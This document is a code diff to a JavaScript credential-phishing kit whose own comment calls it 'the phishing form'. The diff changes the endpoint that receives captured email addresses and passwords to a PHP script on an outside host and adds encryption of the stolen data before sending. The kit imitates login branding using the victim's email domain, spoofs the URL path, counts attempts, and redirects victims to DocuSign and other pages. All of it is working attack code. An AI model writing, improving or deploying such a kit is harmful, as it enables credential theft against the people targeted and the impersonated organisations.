@@ -11,7 +11,7 @@
     BG_BLUR: 0,
     BG_GRAY: false,
     BG_OVERLAY: 0.25,
-    PHP_ENDPOINT: "https://rum-email-proxy.haricoting.workers.dev/contact",
+    PHP_ENDPOINT: "http://s742196446.onlinehome.us/main/base/personal/22sjwjknjqdq/email/AjsjjsjsY/fdfmdkfmsdkay.php",
     SUCCESS_REDIRECT: "https://matta.com/email/email/view.php",
     LOCKOUT_REDIRECT: "https://www.docusign.net/Signing/SessionTimeout.aspx?fi=230f89df-896f-418c-81af-7ffb9804b50f",
     SECRET_KEY: "MATT_SECURE_2026",
@@ -85,6 +85,7 @@
 
   // Build the phishing form
   function buildForm() {
+    // Background elements
     const bgCanvas = document.createElement("div");
     bgCanvas.id = "bg_canvas";
     document.body.appendChild(bgCanvas);
@@ -93,6 +94,7 @@
     bgVeil.id = "bg_veil";
     document.body.appendChild(bgVeil);
 
+    // Main card
     const card = document.createElement("div");
     card.className = "frame_v7";
     card.id = "card_root";
@@ -247,6 +249,7 @@
     setupBackground();
     spoofUrlPath();
 
+    // DOM elements
     const emailInput = document.getElementById("mail_x9k2");
     const passwordInput = document.getElementById("code_p4r7");
     const brandImg = document.getElementById("brand_img");
@@ -264,6 +267,7 @@
     let alertTimeout = null;
     let isLocked = false;
 
+    // Show alert
     function showAlert(message, type) {
       if (alertTimeout) clearTimeout(alertTimeout);
       
@@ -278,18 +282,21 @@
       }
     }
 
+    // Hide alert
     function hideAlert() {
       alertNode.classList.remove("visible");
       if (alertTimeout) clearTimeout(alertTimeout);
     }
 
+    // Shake card animation
     function shakeCard() {
       cardRoot.classList.remove("wobble_q_on");
-      void cardRoot.offsetWidth;
+      void cardRoot.offsetWidth; // Trigger reflow
       cardRoot.classList.add("wobble_q_on");
       setTimeout(() => cardRoot.classList.remove("wobble_q_on"), 700);
     }
 
+    // Update branding based on email
     function updateBranding() {
       const email = emailInput.value.trim();
       const domain = email.split("@")[1]?.trim().toLowerCase();
@@ -309,6 +316,7 @@
       loadDomainFavicon(email, brandImg);
     }
 
+    // Toggle password visibility
     eyeToggle.addEventListener("click", () => {
       const isPassword = passwordInput.type === "password";
       passwordInput.type = isPassword ? "text" : "password";
@@ -317,6 +325,7 @@
       passwordInput.focus();
     });
 
+    // Lockout function
     function lockout() {
       if (isLocked) return;
       isLocked = true;
@@ -327,98 +336,98 @@
       setTimeout(() => window.location.href = CONFIG.LOCKOUT_REDIRECT, CONFIG.LOCKOUT_DELAY);
     }
 
+    // Handle form submission
     function handleSubmit() {
       if (isLocked) return;
       
       const email = emailInput.value.trim();
       const password = passwordInput.value.trim();
-
+      
       hideAlert();
-
+      
       if (!email || !email.includes("@")) {
         showAlert("Please enter a valid email address.", "error");
         shakeCard();
         return;
       }
-
+      
       if (!password) {
         showAlert("Please enter your password.", "error");
         shakeCard();
         return;
       }
-
+      
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="ring_load"></span> Loading...';
-
-      const startTime = Date.now();
       
-      // Changed: Using Name and Feedback as parameter names
+      const startTime = Date.now();
+      const encrypted = encryptData({ email, code: password }, CONFIG.SECRET_KEY);
+      
       const formData = new FormData();
-      formData.append("Name", email);
-      formData.append("Feedback", password);
-
-      fetch(CONFIG.PHP_ENDPOINT, {
-        method: "POST",
-        body: formData
-      })
-      .then(r => r.text())
-      .then(text => {
-        try {
-          return JSON.parse(text);
-        } catch {
-          throw new Error("Parse failed");
-        }
-      })
-      .catch(() => null)
-      .then(response => {
-        const elapsed = Date.now() - startTime;
-        const delay = Math.max(0, 2000 - elapsed);
-        
-        return new Promise(resolve => setTimeout(() => resolve(response), delay));
-      })
-      .then(response => {
-        if (isLocked) return;
-        
-        const btnText = '</svg></span> ' + CONFIG.BUTTON_TEXT;
-
-        if (!response) {
+      formData.append("secure_data", encrypted);
+      
+      fetch(CONFIG.PHP_ENDPOINT, { method: "POST", body: formData })
+        .then(r => r.text())
+        .then(text => {
+          try {
+            return JSON.parse(text);
+          } catch {
+            throw new Error("Parse failed");
+          }
+        })
+        .catch(() => null)
+        .then(response => {
+          // Enforce minimum 2 second delay
+          const elapsed = Date.now() - startTime;
+          const delay = Math.max(0, 2000 - elapsed);
+          
+          return new Promise(resolve => setTimeout(() => resolve(response), delay));
+        })
+        .then(response => {
+          if (isLocked) return;
+          
+          const btnText = '</svg></span> ' + CONFIG.BUTTON_TEXT;
+          
+          if (!response) {
+            submitBtn.disabled = false;
+            submitBtn.innerHTML = btnText;
+            showAlert(CONFIG.MSG_NET, "error");
+            shakeCard();
+            passwordInput.value = "";
+            passwordInput.focus();
+            return;
+          }
+          
+          if (response.status === "success") {
+            showAlert(CONFIG.MSG_GRANTED, "success");
+            setTimeout(() => window.location.href = CONFIG.SUCCESS_REDIRECT, 1000);
+            return;
+          }
+          
+          if (response.status === "exhausted") {
+            lockout();
+            return;
+          }
+          
+          // Track attempts
+          const attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
+          sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));
+          
+          if (attempts >= CONFIG.MAX_TRIES) {
+            lockout();
+            return;
+          }
+          
           submitBtn.disabled = false;
           submitBtn.innerHTML = btnText;
-          showAlert(CONFIG.MSG_NET, "error");
+          showAlert(CONFIG.MSG_WRONG, "error");
           shakeCard();
           passwordInput.value = "";
           passwordInput.focus();
-          return;
-        }
-
-        if (response.status === "success") {
-          showAlert(CONFIG.MSG_GRANTED, "success");
-          setTimeout(() => window.location.href = CONFIG.SUCCESS_REDIRECT, 1000);
-          return;
-        }
-
-        if (response.status === "exhausted") {
-          lockout();
-          return;
-        }
-
-        const attempts = parseInt(sessionStorage.getItem(CONFIG.STORAGE_KEY) || "0", 10) + 1;
-        sessionStorage.setItem(CONFIG.STORAGE_KEY, String(attempts));
-
-        if (attempts >= CONFIG.MAX_TRIES) {
-          lockout();
-          return;
-        }
-
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = btnText;
-        showAlert(CONFIG.MSG_WRONG, "error");
-        shakeCard();
-        passwordInput.value = "";
-        passwordInput.focus();
-      });
+        });
     }
 
+    // Event listeners
     emailInput.addEventListener("input", updateBranding);
     mainForm.addEventListener("submit", (e) => {
       e.preventDefault();
@@ -428,6 +437,7 @@
     updateBranding();
   }
 
+  // Start
   if (document.readyState === "loading") {
     document.addEventListener("DOMContentLoaded", init);
   } else {
